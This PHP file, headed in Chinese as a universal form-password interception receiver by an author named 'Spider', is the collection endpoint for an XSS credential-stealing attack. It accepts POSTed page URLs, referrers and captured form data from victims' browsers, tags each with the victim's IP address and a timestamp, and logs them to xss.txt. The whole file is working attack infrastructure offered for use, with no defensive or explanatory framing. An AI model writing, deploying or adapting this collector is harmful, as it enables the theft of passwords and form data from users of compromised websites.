<?php
/***************
通用截获form密码 php接收文件
作者 Spider
****************/
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
//保存数据的文件
$logfile = './xss.txt';
function filew($filename,$filedata,$filemode) {
        $handle = fopen($filename,$filemode);
        $key = fputs($handle,$filedata);
        fclose($handle);
        return $key;
}
function filer($filename,$filesize = 0) {
        $filesize = $filesize ? $filesize : filesize($filename);
        $handle = fopen($filename,'r');
        $filedata = fread($handle,$filesize);
        fclose($handle);
        return $filedata;
}
function checkgpc($array) {
        foreach($array as $key => $var) { $array[$key] = is_array($var) ? checkgpc($var) : stripslashes($var); }
        return $array;
}
if(get_magic_quotes_gpc()) { $_POST = checkgpc($_POST); }
if(isset($_POST['url']) && isset($_POST['ref']) && isset($_POST['data'])) {
        if(strlen($_POST['url']) > 500 || strlen($_POST['ref']) > 500 || strlen($_POST['data']) > 1000) { exit('数据太大不正常'); }
        $temp = filer($logfile);
        $data = $_POST['url'].'●'.$_POST['ref'].'●'.$_POST['data'];
        //是否重复记录
        if(strpos($temp,$data) > -1) { exit('重复记录'); }
        //来路IP
        $reip = '●'.$_SERVER["REMOTE_ADDR"];
        //时间
        $time = '●'.date('Y-m-d H:i',time());
        filew($logfile,$data.$reip.$time."\r\n",'w');
}
?>